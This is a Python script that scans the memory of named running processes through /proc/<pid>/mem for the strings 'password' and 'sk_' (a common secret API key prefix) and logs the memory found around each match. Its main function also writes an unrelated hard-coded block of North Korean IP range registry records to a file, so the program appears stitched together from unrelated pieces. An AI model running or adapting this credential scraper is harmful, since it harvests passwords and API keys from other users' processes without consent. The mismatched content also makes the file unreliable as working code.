import logging
import psutil

# Define the logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_message(message, level="INFO"):
    if level == "INFO":
        logging.info(message)
    elif level == "WARNING":
        logging.warning(message)
    elif level == "ERROR":
        logging.error(message)

# Define the target process names
TARGET_PROCESS_NAMES = ["process1", "process2", "process3"]

# Define the function to get target pids
def get_target_pids(process_names):
    target_pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in process_names:
            target_pids.append(proc.info['pid'])
    return target_pids

# Define the function to scan memory
def scan_memory(pid, keyword):
    try:
        with open(f"/proc/{pid}/maps", "r") as maps_file:
            maps = maps_file.readlines()
            for line in maps:
                if "rw-" in line:
                    addr = line.split()[0].split('-')
                    start_addr = int(addr[0], 16)
                    end_addr = int(addr[1], 16)
                    try:
                        with open(f"/proc/{pid}/mem", "rb") as mem_file:
                            mem_file.seek(start_addr)
                            data = mem_file.read(end_addr - start_addr)
                            if keyword.encode() in data:
                                return [(start_addr, data)]
                    except OSError as e:
                        log_message(f"Error scanning memory: {e}", "ERROR")
        return []
    except FileNotFoundError:
        log_message(f"Error: Could not open /proc/{pid}/maps for memory scanning.", "ERROR")
        return []

# Define the function to get target address
def get_target_address(pid, keyword):
    results = scan_memory(pid, keyword)
    if results:
        return results[0][0]
    else:
        return None

# Define the function to read targeted memory
def target_memory(pid, address, length):
    try:
        with open(f"/proc/{pid}/mem", "rb") as mem_file:
            mem_file.seek(address)
            data = mem_file.read(length)
            return data.decode('utf-8', errors='ignore')
    except FileNotFoundError:
        log_message(f"Error: Could not open /proc/{pid}/mem for targeted memory.", "ERROR")
        return None
    except OSError as e:
        log_message(f"Error reading targeted memory: {e}", "ERROR")
        return None

# Define the function to print results
def print_results(pid, keyword):
    address = get_target_address(pid, keyword)
    if address is not None:
        memory_data = target_memory(pid, address, 100)
        if memory_data:
            log_message(f"Targeted Memory: {memory_data}")
        else:
            log_message("Failed to read targeted memory.", "ERROR")
    else:
        log_message(f"Keyword '{keyword}' not found.", "WARNING")

# Define the function to save to file
def save_to_file(data, filename):
    with open(filename, "w") as file:
        file.write(data)

# Define the main function
def main():
    target_pids = get_target_pids(TARGET_PROCESS_NAMES)
    if target_pids:
        for pid in target_pids:
            print_results(pid, "password")
            print_results(pid, "sk_")
    else:
        log_message("No target processes found for printing results", "WARNING")

    network_info = """Allocated North Korean network range is 175.45.176.0/22:
inetnum: 175.45.176.0 - 175.45.179.255
netname: STAR-KP
descr: Ryugyong-dong
descr: Potong-gang District
country: KP
status: ALLOCATED PORTABLE
mnt-by: APNIC-HM
mnt-lower: MAINT-STAR-KP
mnt-routes: MAINT-STAR-KP
changed: 20091221
source: APNIC
North Korea also has two more blocks that are assigned to it:
210.52.109.0/24 — assigned through China Unicom:
inetnum: 210.52.109.0 - 210.52.109.255
netname: KPTC
country: CN
descr: Customer of CNC
status: ASSIGNED NON-PORTABLE
changed: 20040803
mnt-by: MAINT-CN-ZM28
source: APNIC
77.94.35.0/24 — assigned by SatGate, a Russian Satellite company:
inetnum: 77.94.35.0 - 77.94.35.255
netname: SATGATE-FILESTREAM
descr: Korean network
country: KP
admin-c: AVA205-RIPE
admin-c: EVE7-RIPE
tech-c: PPU4-RIPE
tech-c: ANM47-RIPE
status: ASSIGNED PA
mnt-by: SATGATE-MNT"""
    save_to_file(network_info, "output.txt")

if __name__ == "__main__":
    main()